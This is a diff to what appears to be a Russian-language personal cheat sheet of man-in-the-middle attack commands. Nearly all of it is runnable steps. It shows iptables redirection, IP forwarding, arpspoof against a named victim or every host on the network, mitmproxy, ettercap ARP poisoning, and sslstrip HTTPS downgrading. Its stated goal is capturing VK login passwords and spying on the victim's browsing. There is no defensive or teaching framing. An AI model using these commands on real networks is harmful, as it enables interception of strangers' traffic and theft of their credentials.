@@ -1,3 +1,18 @@
+//////////////////////////////////////////////////////////////
+///////////////////ПОДМЕНА IP РОУТЕРА/////////////////////////
+///////////////////MITMPROXY, ARPSPOOF////////////////////////
+//////////////////////////////////////////////////////////////
+
+//Сниппет
+//Вкладка 1
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i wlan0 -t ip_жертвы id_роутера 
+//Вкладка 2
+mitmproxy -T --host
+
+
 //MITM атака (Man in the middle)
 https://www.youtube.com/watch?v=quZjKlrmCvQ
 
@@ -34,6 +49,10 @@ echo 1 > /proc/sys/net/ipv4/ip_forward
 
 //Перенаправляем траффик
 arpspoof -i wlan0 -t ip_жертвы id_роутера 
+//для 2-х целей
+arpspoof -i wlan0 -t ip_жертвы_1 -t ip_жертвы_2 id_роутера 
+//для всех целей
+arpspoof -i wlan0 id_роутера 
 
 //Мак адрес атакующего должеен стать как мак роутера
 arp -a
@@ -55,4 +74,58 @@ ctrl+c
 //mitmproxy
 https://login.vk.com/?act=login
 https://www.ok.ru/https
+
+
+
+//////////////////////////////////////////////////////////////
+/////////////////////ПОДМЕНА МАКА РОУТЕРА/////////////////////
+//////////////////////ETTERCUP + SSLSTRIP/////////////////////
+//////////////////////////////////////////////////////////////
+//Установка
+sudo apt-get install ettercap-graphical
+sudo apt-get install sslstrip
+
+//Получение пароля VK
+
+//Включение ip-форвардинга
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+//Подмена  https
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+sslstrip -l 8080
+
+//Включение ettercap
+//Выбор сетевой карты
+Sniff -> Unified sniffing -> Network interface: wlan0
+
+//Сканироварие хостов сети
+Hosts -> Scan for hosts
+
+//Просмотр просканированных хостов
+Hosts -> Hosts list
+Роутер -> Add to target 1
+Жертва -> Add to target 2
+
+//Подмена мака роутера
+Mitm -> Arp poisoning
+v Sniff remote connections
+Ok
+
+//Сниффинг трафика
+Start -> Start sniffing
+
+//Просмотр сайтов жертвы
+//webspy -i wlan0 ip_жертвы
+
+
+
+//////////////////////////////////////////////////////////////
+//////////////////////ARPSPOOF + SSLSTRIP/////////////////////
+//////////////////////////////////////////////////////////////
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+//iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
+echo 1 > /proc/sys/net/ipv4/ip_forward
+arpspoof -i wlan0 -t ip_жертвы id_роутера 
+sslstrip -l 8080
+tail -f sslstrip.log
 
